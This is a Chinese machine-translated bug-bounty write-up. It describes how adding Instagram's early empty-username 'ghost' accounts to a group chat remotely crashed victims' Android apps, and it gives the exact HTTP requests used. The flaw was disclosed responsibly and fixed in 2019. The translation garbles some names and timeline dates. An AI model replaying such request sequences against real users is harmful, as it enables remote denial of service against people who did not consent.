<html>
<head>
<title>How two dead accounts allowed REMOTE CRASH of any Instagram android user</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">两个死亡账号如何让任何Instagram android用户远程崩溃</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-two-dead-users-allowed-remote-crash-of-any-instagram-android-user-8f20e88b1b59?source=collection_archive---------0-----------------------#2019-09-13">https://infosecwriteups.com/how-two-dead-users-allowed-remote-crash-of-any-instagram-android-user-8f20e88b1b59?source=collection_archive---------0-----------------------#2019-09-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/aab2af5b90e45615b2fc5014243c0ad7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eZAswBdVh6AHnC7Z2Jq9eQ.jpeg"/></div></div></figure><h1 id="3409" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">介绍</h1><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi kw"><img src="../Images/f07480e941bf262056459cb952ffc5d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/1*UYMlEorQPW9km_BaFw3ypA.png"/></div></figure><p id="d5b6" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">2019年4月，我有了测试脸书安全(更具体地说是Instagram安全)的愚蠢想法，在我得知该公司在他们的资产上启用了一种新的设置(称为Whitehat Settings)，使研究人员更容易发现新的漏洞(锁定不是问题，我只是有时有点懒:P)。在我最初的研究中，我得出结论，Instagram在其数据库中使用简单的增量PKI来定义平台上的用户帐户，因此我很好奇，想确定哪些是社交网络上创建的第一批帐户。嗯，第一批账户中的一个(我不确定PKID是3还是4)，属于Mike Krieger(insta gram联合创始人之一)。</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lz"><img src="../Images/fd91e6efac3aa6da6aee26e20738ff29.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/0*hIb4VjJmtPjLE69I.gif"/></div></figure><p id="76c6" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">是的，有点显而易见……但是第一个和第二个Instagram账户(PKID = 1 &amp; PKID=2)呢？它们有点不寻常，因为它们与一个ID相关联，而且它们的用户名没有被填充:更准确地说，它们的用户名字段包含一个空字符串("")，我几乎可以肯定这种行为会产生一些问题。我的想法是，这些账户是在Instagram的初始测试阶段创建的，当时它只不过是一个alpha版本。此外，我想知道为什么过了这么长时间它们仍然没有被移走？但是没有人回应这个疑问。从现在开始，让我们称他们为幽灵用户😯</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/a3e40eb53779c930355121903f9059a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/0*6yoaa0CPCFiYOu5w.gif"/></div></figure><p id="ed6e" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">回到我们这里，如果没有服务器端代码的正确管理，空字符串有时可能是危险的:事实上，我的第一个想法是找到一种方法，通过利用对畸形数据的糟糕解析，使Instagram应用程序崩溃。然而，更有趣的是找到一种远程崩溃其他Instagram帐户的方法。</p><p id="dbb0" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">浏览Instagram的几个功能(Instagram的功能比脸书少，但同样非常庞大)，我找到了一个适合这种情况的功能:在Instagram messages选项卡中创建群线程:事实上，可以在Instagram中用其他帐户创建聊天群。具体来说，执行操作的端点是:</p><pre class="kx ky kz la gt mb mc md me aw mf bi"><span id="00cc" class="mg jz iq mc b gy mh mi l mj mk">/api/v1/direct_v2/create_group_thread/</span></pre><h1 id="a668" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">利用</h1><h2 id="c1bb" class="mg jz iq bd ka ml mm dn ke mn mo dp ki lm mp mq km lq mr ms kq lu mt mu ku mv bi translated">技术细节</h2><p id="eef2" class="pw-post-body-paragraph lb lc iq ld b le mw lg lh li mx lk ll lm my lo lp lq mz ls lt lu na lw lx ly ij bi translated">Bug测试是在Android版本等于8.0的三星Galaxy S8+上进行的，开发阶段非常琐碎。</p><p id="64a2" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">为了尝试利用空字符串问题，我首先与一个测试用户一起创建了一个简单的组。根据示例请求:</p><pre class="kx ky kz la gt mb mc md me aw mf bi"><span id="fd4a" class="mg jz iq mc b gy mh mi l mj mk">POST /api/v1/direct_v2/create_group_thread/ HTTP/1.1<br/>User-Agent: Instagram ....<br/>Accept-Language: en-US<br/>Cookie: urlgen= ....<br/>Accept-Encoding: gzip, deflate<br/>Host:i.instagram.com<br/>X-FB-HTTP-Engine: Liger<br/>Connection: close<br/>Content-Length: 353</span><span id="1b36" class="mg jz iq mc b gy nb mi l mj mk">signed_body=d963d5f048924a58712d8bcf7912ac76a7c3c990199c7d59ac25e7990e142f49.{<strong class="mc ir">"recipient_users":"[xxxxxxxxxx]</strong>","_csrftoken":"WBpZmckmENi6eiubd26Osz6SIR3vtowu","thread_title":"bdbdbdbdbdxb","_uid":"12579513534","_uuid":"d18570eb-0663-40f4-bcc3-0c48a5031cee"}&amp;ig_sig_key_version=4</span></pre><p id="627d" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">这里重要的一部分是recipient_users JSON参数，它由受害者instagram ID填充。随后，我使用另一个API端点将一个ghost用户添加到现有组中:</p><pre class="kx ky kz la gt mb mc md me aw mf bi"><span id="0c50" class="mg jz iq mc b gy mh mi l mj mk">POST /api/v1/direct_v2/threads/<strong class="mc ir">yyyyyyyyyy</strong>/add_user/ HTTP/1.1<br/>User-Agent: Instagram ....<br/>Accept-Language: en-US<br/>Cookie: urlgen= ....<br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>Accept-Encoding: gzip, deflate<br/>Host:i.instagram.com<br/>X-FB-HTTP-Engine: Liger<br/>Connection: close<br/>Content-Length: 109</span><span id="6e53" class="mg jz iq mc b gy nb mi l mj mk">_csrftoken=Pod4ZKSSLYUYMPs2TxhN5Xkmsv6xUOsO&amp;<strong class="mc ir">user_ids=["2"]</strong>&amp;_uuid=d18570eb-0663-40f4-bcc3-0c48a5031cee</span></pre><p id="d664" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">在上面的请求中，yyyyyyyyy表示刚刚创建的组线程的ID(从前面的API调用的响应中获得), user_ids数组填充了值2(一个ghost用户的PKID)。</p><p id="61c2" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">第二次请求后，受害者的android Instagram应用程序突然崩溃，用户被迫手动从群中移除才能再次使用！</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/6379d12eddfe9d4ceadde729297f7a40.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/0*bHR5oJ02TZCXhPmW.gif"/></div></figure><p id="2847" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">这可能是由ghost用户用户名中的空字符串的JSON解析异常引起的。下面是崩溃导致的堆栈跟踪示例:</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/42a223c65c35a7a52ac9446a30ceb1ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*FNFAfNI2uVGoUho5.jpg"/></div></div></figure><h1 id="d088" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">影响</h1><p id="0ce6" class="pw-post-body-paragraph lb lc iq ld b le mw lg lh li mx lk ll lm my lo lp lq mz ls lt lu na lw lx ly ij bi translated">利用这个漏洞，只要将Instagram android用户添加到一个以ghost用户为成员的公共组线程中，就有可能远程崩溃任何insta gram Android用户。我注意到，你的Instagram粉丝不需要接受任何请求(对他们来说，这是一种零点击利用)，但“加入群组”的请求必须由不关注攻击者的用户接受。</p><h1 id="8751" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">验证性测试（Proof of Concept的缩写）</h1><figure class="kx ky kz la gt jr"><div class="bz fp l di"><div class="ne nf l"/></div></figure><h1 id="8268" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">时间表</h1><ul class=""><li id="676d" class="ng nh iq ld b le mw li mx lm ni lq nj lu nk ly nl nm nn no bi translated">2019年4月10日—就该bug联系脸书·怀特哈特团队</li><li id="97c0" class="ng nh iq ld b le np li nq lm nr lq ns lu nt ly nl nm nn no bi translated">2019年4月12日—脸书要求提供更多信息</li><li id="9a1f" class="ng nh iq ld b le np li nq lm nr lq ns lu nt ly nl nm nn no bi translated">五月02日。2019/09 2019年9月-研究员和脸书之间交换的各种电子邮件。最终错误确认</li><li id="04df" class="ng nh iq ld b le np li nq lm nr lq ns lu nt ly nl nm nn no bi translated">2019年9月9日—错误已修复</li><li id="001e" class="ng nh iq ld b le np li nq lm nr lq ns lu nt ly nl nm nn no bi translated">2019年9月10日—颁发奖金</li><li id="8847" class="ng nh iq ld b le np li nq lm nr lq ns lu nt ly nl nm nn no bi translated">2019年9月12日—漏洞被披露</li></ul></div><div class="ab cl nu nv hu nw" role="separator"><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz"/></div><div class="ij ik il im in"><p id="2bbf" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated"><em class="ob">原载于2019年9月13日</em><a class="ae oc" href="https://www.valbrux.it/blog/2019/09/13/how-two-dead-users-allowed-remote-crash-of-any-instagram-android-user/" rel="noopener ugc nofollow" target="_blank"><em class="ob">https://www . valbrux . it</em></a><em class="ob">。</em></p></div><div class="ab cl nu nv hu nw" role="separator"><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz oa"/><span class="nx bw bk ny nz"/></div><div class="ij ik il im in"><p id="1777" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated"><em class="ob">关注</em> <a class="ae oc" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ob"> Infosec报道</em> </a> <em class="ob">获取更多此类精彩报道。</em></p><div class="od oe gp gr of og"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="oh ab fo"><div class="oi ab oj cl cj ok"><h2 class="bd ir gy z fp ol fr fs om fu fw ip bi translated">信息安全报道</h2><div class="on l"><h3 class="bd b gy z fp ol fr fs om fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="oo l"><p class="bd b dl z fp ol fr fs om fu fw dk translated">medium.com</p></div></div><div class="op l"><div class="oq l or os ot op ou jw og"/></div></div></a></div></div></div>    
</body>
</html>